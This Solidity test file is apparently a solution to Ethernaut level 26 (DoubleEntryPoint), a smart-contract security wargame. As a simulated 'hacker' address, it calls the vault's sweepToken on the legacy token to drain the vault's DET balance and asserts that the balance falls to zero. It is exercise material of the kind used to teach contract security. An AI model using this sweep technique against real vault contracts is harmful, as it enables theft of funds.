// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "lib/forge-std/ds-test/src/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/26-DoubleEntryPoint/DoubleEntryPointFactory.sol";

contract DoubleEntryPointTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testDoubleEntryPointHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DoubleEntryPointFactory doubleEntryPointFactory = new DoubleEntryPointFactory();
        ethernaut.registerLevel(doubleEntryPointFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(
            doubleEntryPointFactory
        );
        DoubleEntryPoint ethernautDoubleEntryPoint = DoubleEntryPoint(
            payable(levelAddress)
        );

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        CryptoVault vault = CryptoVault(
            ethernautDoubleEntryPoint.cryptoVault()
        );

        address DET = ethernautDoubleEntryPoint.cryptoVault();
        address LGT = ethernautDoubleEntryPoint.delegatedFrom();

        emit log_named_uint(
            "Balance of DET token before attack",
            ethernautDoubleEntryPoint.balanceOf(DET)
        );

        // attack
        vault.sweepToken(IERC20(LGT));

        emit log_named_uint(
            "Balance of DET token after attack",
            ethernautDoubleEntryPoint.balanceOf(DET)
        );

        // Test assertion
        assertEq(ethernautDoubleEntryPoint.balanceOf(DET), 0);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}
